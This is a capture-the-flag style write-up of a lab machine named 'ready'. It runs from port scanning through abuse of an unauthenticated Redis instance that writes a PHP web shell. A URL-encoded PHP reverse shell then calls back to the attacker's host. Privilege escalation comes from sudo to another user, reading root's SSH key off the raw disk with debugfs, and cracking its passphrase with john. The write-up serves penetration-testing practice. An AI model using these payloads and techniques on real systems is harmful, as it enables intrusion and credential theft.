## Recon
4 open ports - ssh, http, http and redis
22, 80, 8080, 6379
```
$ nmap 192.168.174.128 -sVC --min-rate 1000 -p- -v -oN ready.fulltcp
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 51:f9:f5:59:cd:45:4e:d1:2c:06:41:3b:a6:7a:91:19 (RSA)
|   256 5c:9f:60:b7:c5:50:fc:01:fa:37:7c:dc:16:54:87:3b (ECDSA)
|_  256 04:da:68:25:69:d6:2a:25:e2:5b:e2:99:36:36:d7:48 (ED25519)
80/tcp   open  http    Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: Apache2 Test Debian Default Page: It works
6379/tcp open  redis   Redis key-value store 6.0.16
8080/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-title: Apache2 Test Debian Default Page: It works
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.54 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# 80 Recon
fuzz finds nothing

# 8080 Recon
absolutely no directory as well.

# 6379 Recon
redis version 6.0.16
versions <=5.0.5 is vuln to RCE, so this version isnt vulnerable.
We are able to retrieve information with the INFO command implying redis was setup with anon access, no keyspaces to dump.
```shell
192.168.174.128:6379> CONFIG GET dir
1) "dir"
2) "/root"
192.168.174.128:6379> INFO keyspace
# Keyspace
192.168.174.128:6379> 
```
We have 2 web services running, as well as ssh so we can try 2 vectors :
- try to gen an ssh key and see if we can add the public key to authorized keys and ssh in with the private key pair.
- Try to create a webshell and write to the web root and use it to receive a reverse shell.

with the first vector, the current directory where redis runs doesnt reveal a user whom redis runs in the context of or their home directory so we cant tell a name and a path to which we can add the key.

Trying to upload a webshell, we know an apache server is running, so set the web root to that of an apache server.
```shell
192.168.174.128:6379> CONFIG SET dir /var/www/html/
OK
192.168.174.128:6379> CONFIG SET dbfilename rami.php
OK
192.168.174.128:6379> SET test "<?php SYSTEM($_REQUEST['cmd']); ?>"
OK
192.168.174.128:6379> save
OK
```
command execution as a user "ben"
```
┌──(rami㉿zen)-[~/labs/vulnyx/ready]
└─$ curl http://192.168.174.128:8080/rami.php?cmd=id -o /tmp/a
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   158    0   158    0     0   3523      0 --:--:-- --:--:-- --:--:--  3590

┌──(rami㉿zen)-[~/labs/vulnyx/ready]
└─$ cat /tmp/a
REDIS0009�	redis-ver6.0.16�
redis-bits�@�ctime���
�used-mem�pM
 aof-preamble���test"uid=1000(ben) gid=1000(ben) groups=1000(ben),6(disk)
���
   �gqE
```
Send a shell 
```
┌──(rami㉿zen)-[~/labs/vulnyx/ready]
└─$ curl http://192.168.174.128:8080/rami.php?c=php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.174.129%22%2C1337%29%3Bexec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
```

# FootHold
```
┌──(rami㉿zen)-[~/labs/vulnyx/ready]
└─$ ncat -nvlp 1337
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 192.168.174.128:41948.
whoami
ben
python3 -c "import pty;pty.spawn('/bin/bash')"
ben@ready:/var/www/html$ id
id
uid=1000(ben) gid=1000(ben) groups=1000(ben),6(disk)
ben@ready:/var/www/html$ 
```
# Lateral Privesc to another user on host (peter)
sudo privs to run bash as peter with no password
```
ben@ready:/home/ben$ sudo -l
Matching Defaults entries for ben on ready:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ben may run the following commands on ready:
    (peter) NOPASSWD: /usr/bin/bash
ben@ready:/home/ben$ sudo  -u peter /usr/bin/bash
peter@ready:/home/ben$ whoami
peter
```
# Root
Its noticeable that ben belongs to the `disk` group after a group audit 
```shell
peter@ready:/$ groups
peter
peter@ready:/$ groups ben
ben : ben disk
```
members of the disk group can effectively access blocks of storage in the filesystem, we may access the /dev/sda disk which is the primary mount point of the root of theh filesystem and since ssh is running, check if a root ssh is present 
```shell
ben@ready:/home/ben$ lsblk
NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
sda      8:0    0    8G  0 disk 
├─sda1   8:1    0    7G  0 part /
├─sda2   8:2    0    1K  0 part 
└─sda5   8:5    0  975M  0 part [SWAP]
ben@ready:/home/ben$ debugfs /dev/sda1
debugfs 1.46.2 (28-Feb-2021)
debugfs:  cat /root/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,02E266E7A66462FE
<SNIP>
```
tried to login but the key is passphrased, crack that
```shell
┌──(rami㉿zen)-[~/labs/vulnyx/ready]
└─$ ssh2john root.key  > rootkey.hash

┌──(rami㉿zen)-[~/labs/vulnyx/ready]
└─$ john -w=/opt/sc/rockyou.txt rootkey.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
shelly           (root.key)     
1g 0:00:00:00 DONE (2024-04-01 22:24) 16.66g/s 16533p/s 16533c/s 16533C/s marie1..babyface
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Login locally as root, because for some reason Im having key issues with ssh from my machine
```shell
ben@ready:/home/ben$ chmod 600 /tmp/root.key 
ben@ready:/home/ben$ cd /tmp
ben@ready:/tmp$ ls
groupy.sh  root.key
ben@ready:/tmp$ ssh root@localhost -i root.key 
The authenticity of host 'localhost (::1)' can't be established.
ECDSA key fingerprint is SHA256:UhrBwIzhzz8kDj1Kk9SUuU6EdhiY9wLrwX8suu6BZlI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.
Enter passphrase for key 'root.key': 
Linux ready 5.10.0-16-amd64 #1 SMP Debian 5.10.127-1 (2022-06-30) x86_64
Last login: Wed Jul 12 18:22:32 2023
root@ready:~# whoami
root
root@ready:~# id
uid=0(root) gid=0(root) grupos=0(root)
root@ready:~# 
```
